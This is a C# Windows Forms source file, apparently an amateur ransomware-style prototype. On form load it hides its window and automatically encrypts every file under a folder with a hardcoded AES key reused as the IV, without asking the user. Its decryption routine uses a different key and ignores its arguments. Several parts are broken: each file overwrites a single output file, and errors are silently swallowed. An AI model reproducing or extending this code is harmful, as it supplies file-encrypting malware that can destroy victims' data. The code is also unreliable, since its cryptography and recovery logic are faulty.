using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
       

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            this.Hide();
            Form2 form2 = new Form2();
            form2.ShowDialog();

           


            mahoa();


        }
        private static void EncryptFile(string inputFile, string outputFile, string skey)
        {
            try
            {
                using (RijndaelManaged aes = new RijndaelManaged())
                {
                    byte[] key = ASCIIEncoding.UTF8.GetBytes(skey);

                    /* This is for demostrating purposes only.
                     * Ideally you will want the IV key to be different from your key and you should always generate a new one for each encryption in other to achieve maximum security*/
                    byte[] IV = ASCIIEncoding.UTF8.GetBytes(skey);

                    using (FileStream fsCrypt = new FileStream(outputFile, FileMode.Create))
                    {
                        using (ICryptoTransform encryptor = aes.CreateEncryptor(key, IV))
                        {
                            using (CryptoStream cs = new CryptoStream(fsCrypt, encryptor, CryptoStreamMode.Write))
                            {
                                using (FileStream fsIn = new FileStream(inputFile, FileMode.Open))
                                {
                                    int data;
                                    while ((data = fsIn.ReadByte()) != -1)
                                    {
                                        cs.WriteByte((byte)data);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // failed to encrypt file
            }
        }
        private static void DecryptFile(string inputFile, string outputFile, string skey)
        {
            string folder = @"D:\t";
            List<string> duongdan = new List<string>();
            var files = Directory.EnumerateFiles(folder, "*.*", SearchOption.AllDirectories);
            foreach (string item in files)
            {
                duongdan.Add(item);
            }
            Random random = new Random();
            int a = random.Next();
            foreach (string b in files)
            {
                try
                {
                    using (RijndaelManaged aes = new RijndaelManaged())
                    {
                        byte[] key = ASCIIEncoding.UTF8.GetBytes(skey);

                        /* This is for demostrating purposes only.
                         * Ideally you will want the IV key to be different from your key and you should always generate a new one for each encryption in other to achieve maximum security*/
                        byte[] IV = ASCIIEncoding.UTF8.GetBytes(skey);

                        using (FileStream fsCrypt = new FileStream(b, FileMode.Open))
                        {
                           for(int i=0;i<5;i++)
                            {
                                using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
                                {
                                    using (ICryptoTransform decryptor = aes.CreateDecryptor(key, IV))
                                    {
                                        using (CryptoStream cs = new CryptoStream(fsCrypt, decryptor, CryptoStreamMode.Read))
                                        {
                                            int data;
                                            while ((data = cs.ReadByte()) != -1)
                                            {
                                                fsOut.WriteByte((byte)data);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    // failed to decrypt file
                }
            }
           
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
        
    

        private void button1_Click(object sender, EventArgs e)
        {
            
            
            DecryptFile("C:\\encryptedfile.rar", "c:\\file.rar", "password12345678");
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
           
            
        }
        private void mahoa()
        {
            string folder = @"D:\t";
            List<string> duongdan = new List<string>();
            var files = Directory.EnumerateFiles(folder, "*.*", SearchOption.AllDirectories);
            foreach (string item in files)
            {
                duongdan.Add(item);
            }
            Random random = new Random();
            int a = random.Next();
            foreach (string b in files)
            { 
                EncryptFile(b, "D:\\xfgd" + a +".txt", "password12345677");
            }
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
